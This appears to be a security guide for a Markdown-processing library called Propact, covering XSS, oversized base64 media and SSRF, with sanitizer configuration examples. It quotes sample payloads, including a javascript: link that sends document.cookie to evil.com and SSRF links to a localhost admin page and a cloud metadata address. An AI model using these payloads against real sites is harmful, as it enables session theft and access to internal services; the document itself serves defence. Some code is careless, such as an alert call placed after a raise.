# Security Best Practices for Propact

This document outlines security considerations and best practices when using Propact with Markdown-based API protocols.

## 🔒 Security Overview

Propact processes Markdown content that can contain embedded code, links, and media. While Markdown simplifies API interactions, it introduces potential security vulnerabilities that must be addressed.

## ⚠️ Critical Security Issues

### 1. XSS (Cross-Site Scripting) Vulnerabilities

**Problem**: Markdown can contain dangerous JavaScript links and HTML injection.

```markdown
<!-- Dangerous examples -->
[Click me](javascript:alert('XSS'))
![xss](javascript:document.location='http://evil.com/steal?'+document.cookie)
<script>steal_data()</script>
```

**Solution**: Use the built-in sanitizer to block dangerous protocols:

```python
from propact.security import create_sanitizer

# Create strict sanitizer
sanitizer = create_sanitizer(strict=True)
clean_md = sanitizer.sanitize(dangerous_markdown)

# Audit content first
audit = sanitizer.audit(markdown)
if audit['issues']:
    print(f"Security issues found: {audit['issues']}")
```

### 2. Base64 Media Injection

**Problem**: Base64-encoded images can contain malicious content or cause DoS through large payloads.

```markdown
<!-- Large base64 payload can cause memory issues -->
![huge](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...[100KB+])
```

**Solution**: Configure size limits and external storage:

```python
from propact.security import SanitizationConfig
from propact.optimization import create_optimizer

# Configure security
config = SanitizationConfig(
    max_base64_size=512 * 1024,  # 512KB limit
    strict_mode=True
)

# Optimize large media
optimizer = create_optimizer(enable_image_optimization=True)
optimized_md, stats = optimizer.optimize(markdown)
```

### 3. SSRF (Server-Side Request Forgery)

**Problem**: Links to internal resources can be exploited.

```markdown
<!-- Dangerous internal links -->
[Internal API](http://localhost:3000/admin)
[Cloud metadata](http://169.254.169.254/latest/meta-data/)
```

**Solution**: Block dangerous protocols and validate URLs:

```python
from propact.security import MDSanitizer, SanitizationConfig

config = SanitizationConfig(
    allowed_protocols={'http', 'https', 'mailto'},
    strict_mode=True
)

sanitizer = MDSanitizer(config)
clean_md = sanitizer.sanitize(markdown)
```

## 🛡️ Security Configuration

### Basic Security Setup

```python
from propact.security import create_sanitizer
from propact.validation import ValidationPipeline
from propact.optimization import create_optimizer

# Create secure pipeline
sanitizer = create_sanitizer(strict=True, allow_html=False)
optimizer = create_optimizer(
    enable_compression=True,
    enable_image_optimization=True,
    chunk_size=10 * 1024
)

pipeline = ValidationPipeline(
    sanitizer=sanitizer,
    optimizer=optimizer
)

# Validate content
result = await pipeline.validate(markdown, strict=True)
if not result.is_valid:
    print(f"Validation failed: {result.errors}")
```

### Environment Variables for Security

```bash
# .env file
PROACT_SECURITY_STRICT=true
PROACT_SECURITY_MAX_BASE64_SIZE=524288
PROACT_SECURITY_ALLOW_HTML=false
PROACT_SECURITY_RATE_LIMIT=100
PROACT_SECURITY_AUDIT_LOG=true
```

## 🔍 Security Auditing

### Audit Markdown Content

```python
from propact.security import MDSanitizer

sanitizer = MDSanitizer()

# Audit before processing
audit = sanitizer.audit(markdown)
print(f"Dangerous links: {audit['dangerous_links']}")
print(f"Script tags: {audit['has_scripts']}")
print(f"Large base64 images: {len(audit['warnings'])}")

# Block if issues found
if audit['issues']:
    raise SecurityError(f"Security issues detected: {audit['issues']}")
```

### Continuous Monitoring

```python
from propact.validation import ValidationPipeline

pipeline = ValidationPipeline()

# Validate with schema
result = await pipeline.validate(
    markdown,
    schema_name="api_v1",
    schema_version="2026-01-01",
    strict=True
)

# Log security events
if result.errors:
    log_security_event(result.errors)
```

## 🚀 Production Security Checklist

### Pre-deployment Checks

- [ ] Enable strict sanitization (`strict=True`)
- [ ] Set reasonable base64 size limits (≤ 512KB)
- [ ] Disable HTML in Markdown (`allow_html=False`)
- [ ] Configure rate limiting
- [ ] Enable audit logging
- [ ] Set up schema validation
- [ ] Configure external storage for media
- [ ] Enable content optimization

### Runtime Security

```python
import asyncio
from propact import Propact
from propact.security import create_sanitizer
from propact.validation import ValidationPipeline

async def secure_propact_handler(markdown_content):
    # Create secure pipeline
    pipeline = ValidationPipeline(
        sanitizer=create_sanitizer(strict=True),
        optimizer=create_optimizer(enable_compression=True)
    )
    
    # Validate first
    result = await pipeline.validate(markdown_content, strict=True)
    if not result.is_valid:
        raise SecurityError(f"Validation failed: {result.errors}")
    
    # Process with Propact
    propact = Propact()
    return await propact.process(markdown_content)
```

## 🔧 Advanced Security Features

### Custom Security Rules

```python
from propact.security import MDSanitizer, SanitizationConfig

class CustomSanitizer(MDSanitizer):
    def sanitize(self, markdown, strict=None):
        # Custom sanitization logic
        markdown = self._block_custom_patterns(markdown)
        return super().sanitize(markdown, strict)
    
    def _block_custom_patterns(self, content):
        # Block specific patterns
        content = re.sub(r'\[.*?\]\(whatsapp://.*?\)', '[BLOCKED]', content)
        content = re.sub(r'\[.*?\]\(tel:.*?\)', '[BLOCKED]', content)
        return content

config = SanitizationConfig(strict_mode=True)
sanitizer = CustomSanitizer(config)
```

### Schema-based Security

```python
from propact.validation import SchemaRegistry

# Register security schema
security_schema = {
    "type": "object",
    "properties": {
        "protocol": {"enum": ["rest", "mcp", "shell", "ws"]},
        "content": {"type": "string", "maxLength": 10000},
        "attachments": {
            "type": "array",
            "items": {"type": "string", "pattern": "^https?://"}
        }
    },
    "required": ["protocol", "content"]
}

registry = SchemaRegistry()
registry.register_schema("security", "v1", security_schema)
```

## 📊 Security Metrics

Monitor these security metrics:

1. **Blocked Content**: Number of dangerous links/scripts blocked
2. **Validation Failures**: Rate of validation failures
3. **Base64 Size**: Distribution of base64 payload sizes
4. **Schema Drift**: Frequency of schema changes

```python
# Example metrics collection
security_metrics = {
    'blocked_links': 0,
    'blocked_scripts': 0,
    'validation_failures': 0,
    'large_payloads_blocked': 0
}

# Update metrics during processing
audit = sanitizer.audit(markdown)
security_metrics['blocked_links'] += audit['dangerous_links']
security_metrics['blocked_scripts'] += int(audit['has_scripts'])
```

## 🚨 Incident Response

If a security incident is detected:

1. **Immediate Actions**:
   - Block the malicious content
   - Log the incident
   - Alert administrators

2. **Investigation**:
   - Review audit logs
   - Check for similar content
   - Validate schema versions

3. **Remediation**:
   - Update security rules
   - Patch vulnerabilities
   - Notify affected users

```python
def handle_security_incident(content, audit_result):
    # Log incident
    logger.error(f"Security incident: {audit_result}")
    
    # Block content
    raise SecurityError("Malicious content detected")
    
    # Notify admins
    send_alert(f"Security violation detected: {audit_result}")
```

## 📚 Additional Resources

- [OWASP XSS Prevention](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Markdown Security Guide](https://markdownguide.org/security/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## 🆘 Getting Help

For security issues:

1. Check the audit logs for specific errors
2. Review the validation results
3. Ensure proper security configuration
4. Report vulnerabilities to security@propact.dev

Remember: **Security is everyone's responsibility**. Always validate and sanitize input content before processing.
